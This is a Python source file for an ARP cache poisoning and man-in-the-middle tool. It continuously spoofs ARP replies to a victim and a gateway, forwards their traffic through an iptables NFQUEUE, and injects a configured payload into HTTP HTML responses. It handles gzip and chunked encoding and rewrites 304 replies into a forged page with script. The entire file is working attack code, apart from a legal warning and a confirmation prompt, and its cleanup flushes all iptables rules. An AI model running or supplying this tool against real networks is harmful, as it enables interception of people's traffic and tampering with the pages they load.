from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig

# Use configuration values
victim_ip = AttackConfig.VICTIM_IP
gateway_ip = AttackConfig.GATEWAY_IP
interface = NetworkConfig.INTERFACE
victim_mac = AttackConfig.VICTIM_MAC
gateway_mac = AttackConfig.GATEWAY_MAC

# Get current injection payload
injection_code = AttackConfig.INJECTION_PAYLOADS.get(
    AttackConfig.CURRENT_PAYLOAD,
    AttackConfig.INJECTION_CODE
)

import re
import zlib
import io
import gzip
import logging
from datetime import datetime

# Setup detailed logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(PathConfig.ATTACK_LOG),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def enable_ip_forwarding():
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Verify IP forwarding is enabled
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                logger.info("[SETUP] ✅ IP forwarding enabled successfully")
            else:
                logger.warning("[SETUP] ⚠️ IP forwarding may not be enabled")
    except:
        logger.warning("[SETUP] Could not verify IP forwarding status")

def disable_ip_forwarding():
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, victim_mac, spoof_ip):
    pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(pkt, iface=interface, verbose=0)
    logger.debug(f"[ARP-POISON] Sent to {victim_ip} ({victim_mac}): {spoof_ip} is at {get_if_hwaddr(interface)}")

def restore(target_ip, target_mac, source_ip, source_mac):
    logger.info(f"[ARP-RESTORE] Restoring {target_ip} -> {source_ip} mapping")
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=source_ip, hwsrc=source_mac)
    sendp(pkt, count=5, iface=interface, verbose=0)

def inject_at_top(html_bytes, injection_code):
    """
    Insert injection_code bytes immediately after the opening <body> tag if found,
    otherwise at the very beginning of html_bytes.
    """
    pattern = re.compile(b"(<body[^>]*>)", re.IGNORECASE)
    match = pattern.search(html_bytes)
    if match:
        insert_pos = match.end()
        logger.info(f"[INJECTION] Found <body> tag at position {match.start()}-{match.end()}")
        return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
    else:
        # No <body> tag found, insert at start
        logger.warning(f"[INJECTION] No <body> tag found, prepending to content")
        return injection_code + html_bytes

def decode_chunked(data):
    decoded = b""
    chunk_count = 0
    while data:
        pos = data.find(b"\r\n")
        if pos == -1:
            break
        try:
            chunk_size = int(data[:pos], 16)
        except ValueError:
            break
        chunk_count += 1
        if chunk_size == 0:
            break
        data = data[pos+2:]
        decoded += data[:chunk_size]
        data = data[chunk_size+2:]  # skip \r\n after chunk
    logger.info(f"[CHUNKED] Decoded {chunk_count} chunks, total size: {len(decoded)} bytes")
    return decoded

def encode_chunked(data):
    chunks = []
    chunk_size = 1024
    chunk_count = 0
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append(b"%X\r\n" % len(chunk) + chunk + b"\r\n")
        chunk_count += 1
    chunks.append(b"0\r\n\r\n")
    logger.info(f"[CHUNKED] Encoded {chunk_count} chunks")
    return b"".join(chunks)

def extract_request_info(payload):
    """Extract HTTP request information for logging"""
    try:
        lines = payload.decode('utf-8', errors='ignore').split('\n')
        if lines:
            request_line = lines[0].strip()
            host = None
            user_agent = None
            
            for line in lines[1:]:
                if line.lower().startswith('host:'):
                    host = line.split(':', 1)[1].strip()
                elif line.lower().startswith('user-agent:'):
                    user_agent = line.split(':', 1)[1].strip()
            
            return {
                'request_line': request_line,
                'host': host,
                'user_agent': user_agent
            }
    except:
        pass
    return None

def modify_packet(packet):
    scapy_pkt = IP(packet.get_payload())
    
    # Log all intercepted packets first
    src_ip = scapy_pkt.src
    dst_ip = scapy_pkt.dst
    
    if scapy_pkt.haslayer(TCP):
        tcp_layer = scapy_pkt[TCP]
        
        # Check if this traffic involves our target victim
        is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
        
        if not is_victim_traffic:
            packet.accept()
            return
            
        # Log all HTTP traffic involving victim
        if tcp_layer.dport == 80 or tcp_layer.sport == 80:
            logger.info(f"[HTTP-TRAFFIC] {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
            
            # Log return traffic specifically
            if src_ip != victim_ip and dst_ip == victim_ip:
                logger.warning(f"[RETURN-TRAFFIC] 🔄 HTTP Response detected: {src_ip}:{tcp_layer.sport} -> {dst_ip}")
    
    # Only check TCP packets with payload
    if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
        packet.accept()
        return

    tcp_layer = scapy_pkt[TCP]
    payload = scapy_pkt[Raw].load

    # Log HTTP requests and responses with enhanced detection
    is_http_request = payload.startswith(b"GET ") or payload.startswith(b"POST ") or payload.startswith(b"PUT ") or payload.startswith(b"DELETE ")
    is_http_response = payload.startswith(b"HTTP/")
    
    # Also check for responses that might be coming from web servers to victim
    if not is_http_response and tcp_layer.sport == 80 and dst_ip == victim_ip:
        # This might be an HTTP response that doesn't start with HTTP/ (fragmented packet)
        logger.info(f"[HTTP-FRAGMENT] Possible HTTP response fragment from {src_ip}:80 -> {victim_ip}")
        # Try to find HTTP headers in the payload
        if b"Content-Type:" in payload or b"content-type:" in payload:
            logger.warning(f"[HTTP-RESPONSE-ALT] 🔍 Detected HTTP response without HTTP/ start")
            is_http_response = True
    
    if is_http_request or is_http_response:
        if is_http_request:
            # This is an HTTP request
            request_info = extract_request_info(payload)
            if request_info:
                logger.info(f"[HTTP-REQUEST] {request_info['request_line']}")
                if request_info['host']:
                    logger.info(f"[HTTP-REQUEST] Host: {request_info['host']}")
                if request_info['user_agent']:
                    logger.info(f"[HTTP-REQUEST] User-Agent: {request_info['user_agent'][:50]}...")
        
        # Check if this is an HTTP response
        elif is_http_response:
            logger.info(f"[HTTP-RESPONSE] ⭐ RESPONSE INTERCEPTED: {src_ip} -> {dst_ip}")
            
            # Log response status and headers
            try:
                lines = payload.split(b'\r\n')
                first_line = lines[0].decode('utf-8', errors='ignore')
                logger.info(f"[HTTP-RESPONSE] Status: {first_line}")
                
                # Log first few headers for debugging
                for i, line in enumerate(lines[1:6]):  # Show first 5 headers
                    if line:
                        header_line = line.decode('utf-8', errors='ignore')
                        logger.info(f"[HTTP-HEADER] {header_line}")
                
                # Handle 304 Not Modified responses
                if "304 Not Modified" in first_line:
                    logger.warning(f"[HTTP-304] 🔄 Converting 304 Not Modified to 200 OK with injection")
                    
                    # Create a fake 200 response with injected content
                    injected_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Intercepted Page</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .injection {{ background: red; color: white; padding: 20px; border-radius: 10px; margin: 20px 0; }}
        .warning {{ background: orange; color: black; padding: 15px; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="injection">
        <h1>🚨 HTTP INJECTION SUCCESSFUL! 🚨</h1>
        <p><strong>This page has been modified by ARP poisoning + MITM attack!</strong></p>
        <p>Target Device: {dst_ip}</p>
        <p>Original request was for: {request_info.get('host', 'unknown') if 'request_info' in locals() else 'unknown'}</p>
        <p>Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    <div class="warning">
        <h2>Technical Details:</h2>
        <p>• ARP poisoning redirected traffic through attacker machine</p>
        <p>• HTTP response intercepted and modified</p>
        <p>• Original response was: 304 Not Modified (converted to 200 OK)</p>
        <p>• Attack successful at {time.strftime('%H:%M:%S')}</p>
    </div>
    <script>
        alert('🚨 SECURITY ALERT: This page has been compromised via ARP poisoning!');
        console.log('HTTP injection successful - page modified by MITM attack');
    </script>
</body>
</html>"""
                    
                    # Create new HTTP response
                    new_response = f"HTTP/1.1 200 OK\r\n"
                    new_response += f"Content-Type: text/html; charset=utf-8\r\n"
                    new_response += f"Content-Length: {len(injected_html)}\r\n"
                    new_response += f"Connection: close\r\n"
                    new_response += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
                    new_response += f"Pragma: no-cache\r\n"
                    new_response += f"Expires: 0\r\n"
                    new_response += f"\r\n{injected_html}"
                    
                    # Update packet with new response
                    scapy_pkt[Raw].load = new_response.encode()
                    
                    # Recalculate packet lengths and checksums
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_pkt))
                    logger.warning(f"[HTTP-304] ✅ Successfully converted 304 to 200 with injection!")
                    packet.accept()
                    return
                
                # Handle 200 OK responses with HTML content
                if "200 OK" in first_line:
                    # Check if it's HTML content
                    has_html_content = False
                    for line in lines:
                        if b"content-type:" in line.lower() and b"text/html" in line.lower():
                            has_html_content = True
                            break
                    
                    if has_html_content:
                        logger.warning(f"[HTTP-200] 🎯 Found 200 OK HTML response - processing for injection")
                        # Continue to normal HTML processing below with complete payload
                    else:
                        logger.info(f"[HTTP-200] 200 OK but not HTML content - skipping injection")
                        packet.accept()
                        return
                else:
                    logger.info(f"[HTTP-OTHER] Non-injectable response: {first_line}")
                    packet.accept()
                    return
                    
            except Exception as e:
                logger.error(f"[HTTP-RESPONSE] Error processing HTTP response: {e}")
                # Show raw payload for debugging
                payload_preview = payload[:200].decode('utf-8', errors='ignore')
                logger.error(f"[HTTP-DEBUG] Payload preview: {payload_preview}")
                packet.accept()
                return
    
    # Handle fragments from ongoing streams
    elif tcp_layer.sport == 80 and dst_ip == victim_ip:
        # This might be a continuation of an HTTP response
        # No stream buffering, just accept and let modify_packet handle it
        logger.info(f"[DEBUG-RESPONSE] Return traffic from {src_ip}:80 but no HTTP headers detected")
        payload_preview = payload[:100].decode('utf-8', errors='ignore')
        logger.info(f"[DEBUG-PAYLOAD] First 100 bytes: {repr(payload_preview)}")

    # Process regular HTML responses (original logic)
    if not (b"HTTP/" in payload and b"Content-Type: text/html" in payload):
        # Log why we're not processing this packet
        if b"HTTP/" in payload:
            # It's HTTP but not HTML
            content_type = None
            try:
                headers = payload.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
                for line in headers.split('\r\n'):
                    if line.lower().startswith('content-type:'):
                        content_type = line.split(':', 1)[1].strip()
                        break
                logger.info(f"[HTTP-SKIP] Non-HTML response: {content_type}")
            except:
                logger.info(f"[HTTP-SKIP] HTTP response but couldn't parse content-type")
        packet.accept()
        return

    logger.info(f"[HTTP-HTML] 🎯 Processing HTML response from {src_ip} to {dst_ip}")

    try:
        header_raw, body = payload.split(b"\r\n\r\n", 1)
    except ValueError:
        logger.warning(f"[HTTP-HTML] Failed to split headers and body")
        packet.accept()
        return

    headers_text = header_raw.decode(errors='ignore')
    header_dict = {}
    for line in headers_text.split("\r\n")[1:]:
        parts = line.split(":", 1)
        if len(parts) == 2:
            header_dict[parts[0].strip().lower()] = parts[1].strip().lower()

    # Log important headers
    content_type = header_dict.get("content-type", "")
    content_length = header_dict.get("content-length", "")
    content_encoding = header_dict.get("content-encoding", "")
    transfer_encoding = header_dict.get("transfer-encoding", "")
    
    logger.info(f"[HTTP-HEADERS] Content-Type: {content_type}")
    logger.info(f"[HTTP-HEADERS] Content-Length: {content_length}")
    logger.info(f"[HTTP-HEADERS] Content-Encoding: {content_encoding}")
    logger.info(f"[HTTP-HEADERS] Transfer-Encoding: {transfer_encoding}")

    is_gzip = header_dict.get("content-encoding") == "gzip"
    is_chunked = header_dict.get("transfer-encoding") == "chunked"

    logger.info(f"[HTTP-PROCESSING] Gzip: {is_gzip}, Chunked: {is_chunked}, Body size: {len(body)} bytes")

    if is_gzip:
        logger.info("[HTTP-PROCESSING] Processing gzip-compressed response")

        try:
            raw_body = body
            if is_chunked:
                logger.info("[HTTP-PROCESSING] Decoding chunked encoding first")
                raw_body = decode_chunked(body)

            # Decompress gzip body
            logger.info(f"[GZIP] Decompressing {len(raw_body)} bytes")
            decompressed = gzip.decompress(raw_body)
            logger.info(f"[GZIP] Decompressed to {len(decompressed)} bytes")

            # Log HTML preview
            html_preview = decompressed[:200].decode('utf-8', errors='ignore')
            logger.info(f"[HTML-PREVIEW] {html_preview}...")

            # Inject at top
            logger.info(f"[INJECTION] Attempting injection...")
            injected_body = inject_at_top(decompressed, injection_code)
            
            if len(injected_body) > len(decompressed):
                logger.info(f"[INJECTION] ✅ Successfully injected {len(injected_body) - len(decompressed)} bytes")
            else:
                logger.warning(f"[INJECTION] ❌ Injection may have failed - no size increase")

            # Recompress gzip body
            logger.info(f"[GZIP] Recompressing {len(injected_body)} bytes")
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode='wb') as f:
                f.write(injected_body)
            recompressed = buf.getvalue()
            logger.info(f"[GZIP] Recompressed to {len(recompressed)} bytes")

            if is_chunked:
                logger.info("[HTTP-PROCESSING] Re-encoding as chunked")
                recompressed = encode_chunked(recompressed)

            # Update Content-Length header if exists and not chunked
            if not is_chunked and "content-length" in header_dict:
                new_length = str(len(recompressed))
                headers_text = re.sub(
                    r"(?i)^(Content-Length:\s*)\d+", 
                    f"Content-Length: {new_length}", 
                    headers_text, flags=re.MULTILINE
                )
                logger.info(f"[HTTP-HEADERS] Updated Content-Length to {new_length}")

            # Rebuild full payload
            new_payload = headers_text.encode() + b"\r\n\r\n" + recompressed

            scapy_pkt[Raw].load = new_payload

            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            packet.set_payload(bytes(scapy_pkt))
            logger.info("[INJECTION] ✅ Gzip injection and recompression successful")

        except Exception as e:
            logger.warning(f"[INJECTION] ⚠️ Gzip injection failed (likely incomplete response): {e}")
            logger.info(f"[INJECTION] Skipping injection and passing through original packet")
            # Just pass through the original packet without modification
            packet.accept()
            return

    else:
        logger.info("[HTTP-PROCESSING] Processing non-gzip response")
        try:
            # Log original body preview
            body_preview = body[:200].decode('utf-8', errors='ignore')
            logger.info(f"[HTML-PREVIEW] {body_preview}...")
            
            logger.info(f"[INJECTION] Attempting injection...")
            modified_body = inject_at_top(body, injection_code)
            
            if len(modified_body) > len(body):
                logger.info(f"[INJECTION] ✅ Successfully injected {len(modified_body) - len(body)} bytes")
            else:
                logger.warning(f"[INJECTION] ❌ Injection may have failed - no size increase")
            
            new_content_length = str(len(modified_body))

            if re.search(r"(?i)^Content-Length:\s*\d+", headers_text, re.MULTILINE):
                headers_text = re.sub(r"(?i)^(Content-Length:\s*)\d+", 
                                      f"Content-Length: {new_content_length}", headers_text, flags=re.MULTILINE)
                logger.info(f"[HTTP-HEADERS] Updated Content-Length to {new_content_length}")
            else:
                headers_text += f"\r\nContent-Length: {new_content_length}"
                logger.info(f"[HTTP-HEADERS] Added Content-Length: {new_content_length}")

            new_payload = headers_text.encode() + b"\r\n\r\n" + modified_body

            scapy_pkt[Raw].load = new_payload

            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            packet.set_payload(bytes(scapy_pkt))

            logger.info(f"[INJECTION] ✅ Non-gzip injection successful")
        except Exception as e:
            logger.error(f"[INJECTION] ❌ Non-gzip injection failed: {e}")
            packet.accept()
            return

    packet.accept()



def start_packet_injection():
    logger.info("[SETUP] Setting up iptables rule for packet interception")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify iptables rule was added
    import subprocess
    try:
        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], capture_output=True, text=True)
        if 'NFQUEUE' in result.stdout:
            logger.info("[SETUP] ✅ iptables NFQUEUE rule successfully added")
        else:
            logger.warning("[SETUP] ⚠️ iptables rule may not have been added correctly")
    except:
        logger.warning("[SETUP] Could not verify iptables rule")
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_packet)
    
    logger.info("[MITM] 🚀 HTTP injection system started")
    logger.info("[MITM] 📡 Monitoring for HTTP traffic...")
    
    logger.info(f"[MITM] 🎯 Single victim mode: {victim_ip} -> gateway: {gateway_ip}")
    
    logger.info("[MITM] 💉 Injection payload: {} ({} bytes)".format(
        AttackConfig.CURRENT_PAYLOAD, 
        len(injection_code)
    ))
    logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        logger.info("\n[MITM] 🛑 Stopping HTTP injector...")
    finally:
        nfqueue.unbind()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")

def display_attack_configuration():
    """Display current attack configuration and get user confirmation"""
    print("\n" + "="*70)
    print("🎯 ARP CACHE POISONING & MITM ATTACK CONFIGURATION")
    print("="*70)
    
    print(f"\n📡 NETWORK INTERFACE:")
    print(f"   Interface: {interface}")
    
    print(f"\n🎯 ATTACK TARGETS:")
    print(f"   Victim Device:")
    print(f"     IP:  {victim_ip}")
    print(f"     MAC: {victim_mac}")
    
    print(f"\n   Gateway/Router:")
    print(f"     IP:  {gateway_ip}")
    print(f"     MAC: {gateway_mac}")
    
    # Get current injection payload info
    current_payload = AttackConfig.INJECTION_PAYLOADS.get(AttackConfig.CURRENT_PAYLOAD, AttackConfig.INJECTION_CODE)
    payload_preview = current_payload.decode('utf-8', errors='ignore')[:100] if isinstance(current_payload, bytes) else str(current_payload)[:100]
    
    print(f"\n💉 HTTP INJECTION:")
    print(f"   Payload Type: {AttackConfig.CURRENT_PAYLOAD}")
    print(f"   Injection Enabled: {AttackConfig.ENABLE_HTTP_INJECTION}")
    print(f"   Payload Preview: {payload_preview}{'...' if len(payload_preview) >= 100 else ''}")
    
    print(f"\n⚙️  ATTACK SETTINGS:")
    print(f"   ARP Poison Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
    print(f"   Packet Logging: {AttackConfig.ENABLE_PACKET_LOGGING}")
    print(f"   Gzip Handling: {AttackConfig.ENABLE_GZIP_HANDLING}")
    
    print(f"\n🛡️  SECURITY SETTINGS:")
    print(f"   Auto Cleanup: {SecurityConfig.AUTO_CLEANUP}")
    print(f"   Max Duration: {SecurityConfig.MAX_ATTACK_DURATION} seconds")
    print(f"   Legal Warning: {SecurityConfig.SHOW_LEGAL_WARNING}")
    
    print(f"\n📊 NETWORK STATUS:")
    # Check if targets are reachable
    import subprocess
    
    # Check victim
    print(f"   Victim ({victim_ip}):")
    try:
        victim_ping = subprocess.run(['ping', '-c', '1', '-W', '1', victim_ip], 
                                       capture_output=True, timeout=3)
        victim_status = "🟢 Reachable" if victim_ping.returncode == 0 else "🔴 Unreachable"
    except:
        victim_status = "❓ Unknown"
    print(f"     Status: {victim_status}")
        
        # Check if victim is in ARP table
    try:
        arp_result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
        victim_in_arp = victim_ip in arp_result.stdout
        print(f"     In ARP table: {'✅' if victim_in_arp else '❌'}")
    except:
        print(f"     ARP table: ❓ Unable to check")
    
    # Check gateway
    print(f"\n   Gateway ({gateway_ip}):")
    try:
        gateway_ping = subprocess.run(['ping', '-c', '1', '-W', '1', gateway_ip], 
                                    capture_output=True, timeout=3)
        gateway_status = "🟢 Reachable" if gateway_ping.returncode == 0 else "🔴 Unreachable"
    except:
        gateway_status = "❓ Unknown"
    
    print(f"     Status: {gateway_status}")
    
    try:
        arp_result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
        gateway_in_arp = gateway_ip in arp_result.stdout
        print(f"     In ARP table: {'✅' if gateway_in_arp else '❌'}")
    except:
        print(f"     ARP table: ❓ Unable to check")
    
    print("="*70)
    
    if SecurityConfig.SHOW_LEGAL_WARNING:
        print("\n⚠️  LEGAL WARNING:")
        print("   This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY!")
        print("   Ensure you have explicit permission to test this network.")
        print("   Unauthorized network attacks are illegal and may result in criminal charges.")
    
    print("\n🚀 ATTACK FLOW:")
    print("   1. Enable IP forwarding on this machine")
    print("   2. Start continuous ARP poisoning (bidirectional)")
    print("   3. Set up iptables rules for packet interception")
    print("   4. Launch HTTP content injection")
    print("   5. Monitor and log all activities")
    print("   6. Clean up and restore on exit (Ctrl+C)")
    
    if SecurityConfig.REQUIRE_CONFIRMATION:
        print("\n" + "="*70)
        confirmation = input("🔍 Do you want to proceed with this attack? [y/N]: ").lower().strip()
        if confirmation not in ['y', 'yes']:
            print("❌ Attack cancelled by user.")
            sys.exit(0)
        
        print("✅ Attack confirmed. Starting in 3 seconds...")
        time.sleep(3)
    
    print("="*70)

def main():
    # Display attack configuration and get confirmation
    display_attack_configuration()
    
    logger.info("[ATTACK] 🚀 Starting ARP poisoning & MITM attack")
    logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
    
    enable_ip_forwarding()

    def exit_gracefully(signum, frame):
        logger.info("\n[CLEANUP] 🧹 Starting cleanup process...")
        logger.info("[CLEANUP] Restoring ARP tables...")
        
        # Restore ARP tables for all victims
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        
        disable_ip_forwarding()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start ARP poisoning in background
    def poison_loop():
        logger.info("[ARP-POISON] 🎯 Starting continuous ARP poisoning")
        logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
        
        logger.info(f"[ARP-POISON] Single victim mode: {victim_ip} <-> {gateway_ip}")
        
        poison_count = 0
        while True:
            # Poison victim: tell victim that gateway is at attacker's MAC
            poison(victim_ip, victim_mac, gateway_ip)
                
            # Poison gateway: tell gateway that this victim is at attacker's MAC
            poison(gateway_ip, gateway_mac, victim_ip)
            
            poison_count += 2  # 2 packets per victim (bidirectional)
            if poison_count % 10 == 0:  # Log every 10 rounds
                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets")
            
            time.sleep(AttackConfig.ARP_POISON_INTERVAL)

    from threading import Thread
    poison_thread = Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Give ARP poisoning time to take effect
    logger.info("[ATTACK] Waiting 3 seconds for ARP poisoning to take effect...")
    time.sleep(3)

    # Start HTTP injection
    start_packet_injection()

if __name__ == "__main__":
    main()
